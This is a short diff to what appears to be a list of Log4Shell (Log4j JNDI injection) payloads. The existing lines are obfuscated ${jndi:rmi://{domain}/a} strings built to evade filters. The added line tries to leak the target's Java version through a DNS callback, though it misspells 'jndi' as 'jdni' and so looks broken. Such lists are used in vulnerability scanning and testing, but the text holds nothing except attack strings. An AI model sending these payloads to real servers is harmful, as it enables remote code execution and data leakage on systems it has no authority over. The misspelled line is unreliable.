@@ -6,3 +6,4 @@ ${${::-j}ndi:rmi://{domain}/a}
 ${${lower:jndi}:${lower:rmi}://{domain}/a}
 ${${upper:${upper:jndi}}:${upper:rmi}://{domain}/a}
 ${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{domain}/a}
+${jdni:rmi://x${sys:java.version}.{domain}/a} 
